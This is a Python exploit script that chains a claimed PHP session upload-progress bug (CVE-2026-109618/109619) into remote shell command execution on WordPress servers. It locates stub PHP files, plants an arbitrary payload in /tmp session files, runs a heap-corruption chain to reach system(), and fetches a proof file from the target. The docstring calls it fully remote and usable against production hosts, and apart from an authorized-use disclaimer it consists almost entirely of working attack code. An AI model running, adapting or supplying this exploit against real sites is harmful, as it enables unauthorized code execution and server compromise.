#!/usr/bin/env python3
"""
wp_exploit.py — PHP2Shell (CVE-2026-109618 / CVE-2026-109619) for WordPress.

FULLY REMOTE: no docker exec, no bind mounts, no local container access.
Runs against any reachable PHP URL (staging/production alike), within the
calibrated lab envelope (see CAVEATS).

Pipeline:
  1. Discover a WP-less PHP stub URL (WordPress' shipped "Silence is golden"
     files). The chain's heap choreography is residue-calibrated; WordPress'
     bootstrap burst poisons the chunk, so the dance runs only against a URL
     that never loads wp-load. Pass --skip-discovery to use --url directly.
  2. Deliver an arbitrary-length payload THROUGH THE BUG ITSELF: the
     upload-progress key value is stored raw in the session file; newlines
     make it a shell script line. The producer's OOM abort skips the
     END-cleanup, so /tmp/sess_<sid> survives with the payload on disk.
     (No file-write primitive, no LFI, no app dependency.)
  3. Run the validated php2shell chain (worker rotation -> chunk leak ->
     libphp leak -> fake HashTable -> zif_system) with the 14-byte command
     `sh</tmp/sess_<sid>` — arbitrary command execution as the web user.
  4. Proof: fetch the artifact the payload wrote (default: WP uploads)
     over plain HTTP — the proof is served by the target application.

CAVEATS (the calibrated envelope):
  - single-worker prefork mod_php (php:8.4.26-apache profile) for the exact
    calibration; multi-worker hosts need keep-alive pinning (not yet built),
  - memory_limit 8M; larger limits shift the stage-1 fillers (recalibration),
  - display_errors=On for the current full chain (the display_errors-off RCE
    is not public yet; the leak alone works),
  - CVE pair patched in PHP >= 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.

Authorized-use only: run only against installations you own or have
permission to test.

Usage:
  python3 wp_exploit.py --url http://staging-host/index.php
  python3 wp_exploit.py --url http://127.0.0.1:8088/index.php \
      --cmd-payload "id > /var/www/html/wp-content/uploads/pwn_proof.txt 2>&1" \
      --fetch /wp-content/uploads/pwn_proof.txt
"""
import argparse
import subprocess
import sys
import os
import urllib.request
import urllib.parse as up

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
import php_exploit_general as GEN

CANDIDATES = [
    "/wp-content/index.php",
    "/wp-content/plugins/index.php",
    "/wp-content/themes/index.php",
    "/wp-content/uploads/index.php",
]

WP_MARKERS = (b"wp-content", b"wp-includes", b"WordPress", b"wp-json",
              b"Error establishing", b"wp-admin", b"wp-settings")


def looks_wpless(resp: bytes) -> bool:
    try:
        head, _, body = resp.partition(b"\r\n\r\n")
    except ValueError:
        return False
    if b" 200" not in head.split(b"\r\n")[0]:
        return False
    if len(body) > 64:
        return False
    return not any(m in body for m in WP_MARKERS)


def origin_of(url: str) -> str:
    u = up.urlsplit(url)
    port = u.port or (443 if u.scheme == "https" else 80)
    return "%s://%s:%s" % (u.scheme, u.hostname, port)


def discover_wpless(url: str):
    o = origin_of(url)
    t = GEN.Target(o + "/", timeout=15.0)
    for cand in CANDIDATES:
        try:
            code, body = t.get(cand, read_cap=1 << 20)
        except Exception:
            continue
        if code == 200 and len(body) <= 64 and not any(m in body for m in WP_MARKERS):
            print("[+] WP-less stub found: %s (%d bytes)" % (cand, len(body)))
            return o + cand
    return None


def main():
    ap = argparse.ArgumentParser(description="wp_exploit: mount-free, docker-free php2shell for WordPress (authorized use only)")
    ap.add_argument("--url", required=True, help="any PHP URL on the target (origin + discovery base)")
    ap.add_argument("--skip-discovery", action="store_true", help="use --url directly for the chain")
    ap.add_argument("--cmd-payload", default="id > /var/www/html/wp-content/uploads/pwn_proof.txt 2>&1",
                    help="arbitrary-length command; delivered via session-file injection")
    ap.add_argument("--fetch", default="/wp-content/uploads/pwn_proof.txt",
                    help="path fetched over HTTP afterwards as proof ('' to skip)")
    ap.add_argument("--payload-sid", default="a")
    args = ap.parse_args()

    target_url = args.url if args.skip_discovery else discover_wpless(args.url)
    if not target_url:
        print("[-] no WP-less PHP stub URL discovered (stage 1 breaks on WP residue). "
              "Expose/create a WP-less PHP file, or pass --skip-discovery to try --url anyway.")
        return 1

    # arbitrary-length command: session-file injection + 14-byte chain cmd
    argv = ["python3", os.path.join(_HERE, "php_exploit_general.py"),
            "-u", target_url, "--profile", "bookworm",
            "--payload", args.cmd_payload, "--payload-sid", args.payload_sid,
            "--fetch", args.fetch]             # proof channel = HTTP fetch
    rc = subprocess.call(argv)
    if rc != 0:
        return rc

    if args.fetch:
        art = origin_of(target_url) + args.fetch
        try:
            body = urllib.request.urlopen(art, timeout=10).read().decode(errors="replace")
            print("[+] proof served by the target (%s):\n%s" % (art, body))
            return 0
        except Exception as e:
            print("[!] proof fetch failed (%s): %s" % (art, e))
            print("    (the command still executed; adjust --fetch/--cmd-payload or check OOB)")
            return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
